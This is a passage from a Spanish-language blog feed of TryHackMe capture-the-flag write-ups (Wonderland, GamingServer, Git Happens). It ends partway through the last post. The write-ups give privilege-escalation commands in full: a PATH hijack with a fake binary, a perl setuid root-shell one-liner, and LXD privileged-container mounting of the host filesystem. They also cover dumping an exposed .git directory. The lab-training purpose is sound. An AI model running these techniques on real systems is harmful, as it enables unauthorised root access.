&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Hijacking PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/rabbit:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt; &amp;gt; date
chmod +x date

&lt;span class=&#34;c1&#34;&gt;#Binario&lt;/span&gt;
/home/rabbit/teaParty
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutamos el binario &lt;code&gt;teaParty&lt;/code&gt; el cual nos devuelve una shell con el usuario &lt;code&gt;Hatter&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-27-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Intentamos ejecutar &lt;code&gt;perl&lt;/code&gt; ya que tiene &amp;ldquo;capabilites&amp;rdquo; &lt;code&gt;cap_setuid+ep&lt;/code&gt; que al intentarlo con alice y rabbit no fue posible tomar ventaja. Logramos obtener una shell con usuario root y obtener nuestras flags &lt;code&gt;user.txt&lt;/code&gt; y &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/perl -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;use POSIX (setuid); POSIX::setuid(0); exec &amp;#34;/bin/bash&amp;#34;;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-47-21.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Info&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation Using PATH Variable&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Linux Privilege Escalation using Capabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/wonderland/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/wonderland/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>capabilities</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - GamingServer</title>
        <link>https://sckull.github.io/posts/gamingserver/</link>
        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/gamingserver/</guid>
        <description>GamingServer es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;GamingServer es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;GamingServer&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;An Easy Boot2Root box for beginners&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;110&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/SuitGuy&#34;&gt;SuitGuy&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 21:03:37 2020 as: nmap -sV -o mini_scan gaming.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; gaming.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.202.248&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.28s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 21:04:17 2020 -- 1 IP address (1 host up) scanned in 39.71 seconds&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-06-34.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo fuente encontramos un posible nombre de usuario comentado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/gamingserver$ gobuster dir -u http://gaming.thm/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -q -x php,html,txt
/about.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/about.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/secret &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/uploads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;/secret&lt;/code&gt; encontramos una clave privada encriptada seguramente de alguno de los usuarios dentro de la maquina. Utilizamos John para obtener la frase de la clave privada.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-12-59.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/uploads/&lt;/code&gt; encontramos varios archivos entre ellos un posible wordlist.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-12-22.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;john---user&#34;&gt;JOHN - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos la clave privada y la frase que encontramos con el usuario john en el servicio ssh y logramos obtener una shell y nuestr flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-23-57.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion, vemos que el usuario se encuentra en el grupo de &lt;code&gt;lxd&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2&#34;&gt;&lt;strong&gt;LXD&lt;/strong&gt;&lt;/a&gt; para realizar privilege escalation al igual que &lt;a href=&#34;https://sckull.github.io/posts/jokerctf/#privilege-escalation&#34;&gt;&lt;strong&gt;THM - HA Joker CTF&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#LOCAL&lt;/span&gt;
git clone  https://github.com/saghul/lxd-alpine-builder.git
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; lxd-alpine-builder
./build-alpine -a i686

&lt;span class=&#34;c1&#34;&gt;#GAMINSERVER MACHINE&lt;/span&gt;
lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage
lxc image list

lxc init myimage sckull -c security.privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc config device add sckull mydevice disk &lt;span class=&#34;nv&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/ &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&#34;nv&#34;&gt;recursive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
lxc start sckull
lxc &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; sckull /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario root (container) y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-59-22.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-59-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/gamingserver/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/gamingserver/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>lxd</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Git Happens</title>
        <link>https://sckull.github.io/posts/githappens/</link>
        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/githappens/</guid>
        <description>Git Happens es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Git Happens es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Git Happens&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Boss wanted me to create a prototype, so here it is! We even used something called &amp;ldquo;version control&amp;rdquo; that made deploying this really easy!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/hydragyrum&#34;&gt;hydragyrum&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 17:41:27 2020 as: nmap -sV -o mini_scan git.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; git.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.187.108&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.33s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;999&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 17:42:05 2020 -- 1 IP address (1 host up) scanned in 38.04 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web  con un panel en el puerto 80.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_15-50-32.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo fuente de la pagina encontramos codigo javascript ofuscado, con un array que contiene informacion &amp;ldquo;desordenada&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_15-52-22.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/githappens$ gobuster dir -u http://git.thm/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/.git/HEAD &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/dashboard.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gittools&#34;&gt;GITTOOLS&lt;/h2&gt;
&lt;p&gt;Encontramos el directorio &lt;code&gt;.git&lt;/code&gt; con gobuster, utilizamos &lt;strong&gt;GitTools&lt;/strong&gt; al igual que en &lt;a href=&#34;https://sckull.github.io/posts/harder/#gittools&#34;&gt;&lt;strong&gt;Harder de TryHackme&lt;/strong&gt;&lt;/a&gt; para obtener la informacion expuesta disponible.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_15-59-13.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~/tools/GitTools/Dumper/gitdumper.sh http://git.thm/.git/ .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_16-00-25.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Una vez utilizado el Dumper ejecutamos el Extractor de GitTools o podemos utilizar el propio Git para recuperar la informacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Git Extractor&lt;/span&gt;
~/tools/GitTools/Extractor/extractor.sh . .

